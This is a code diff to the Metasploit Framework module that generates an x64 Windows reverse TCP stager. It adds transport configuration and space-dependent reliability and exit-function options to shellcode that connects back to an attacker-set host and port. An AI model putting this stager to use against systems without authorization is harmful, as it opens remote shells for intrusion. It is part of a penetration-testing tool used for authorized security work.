@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -14,6 +15,7 @@ module Msf
 
 module Payload::Windows::ReverseTcp_x64
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
@@ -29,23 +31,18 @@ module Payload::Windows::ReverseTcp_x64
   # Generate the first stage
   #
   def generate
-    # TODO: coming later
-    # Generate the simple version of this stager if we don't have enough space
-    #if self.available_space.nil? || required_space > self.available_space
-    #  return generate_reverse_tcp(
-    #    port: datastore['LPORT'],
-    #    host: datastore['LHOST'],
-    #    retry_count: datastore['ReverseConnectRetries'],
-    #  )
-    #end
-
     conf = {
-      host:        datastore['LHOST'],
       port:        datastore['LPORT'],
+      host:        datastore['LHOST'],
       retry_count: datastore['ReverseConnectRetries'],
-      exitfunk:    datastore['EXITFUNC'],
-      reliable:    true
+      reliable:    false
     }
+
+    # Generate the advanced stager if we have space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:reliable] = true
+    end
 
     generate_reverse_tcp(conf)
   end
@@ -64,6 +61,10 @@ module Payload::Windows::ReverseTcp_x64
       #{asm_reverse_tcp(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
+  end
+
+  def transport_config(opts={})
+    transport_config_reverse_tcp(opts)
   end
 
   #
@@ -92,8 +93,9 @@ module Payload::Windows::ReverseTcp_x64
   #
   def asm_reverse_tcp(opts={})
 
-    #retry_count  = [opts[:retry_count].to_i, 1].max
-    # TODO: reliable     = opts[:reliable]
+    # TODO: reliability coming later
+    reliable     = opts[:reliable]
+    retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
     encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
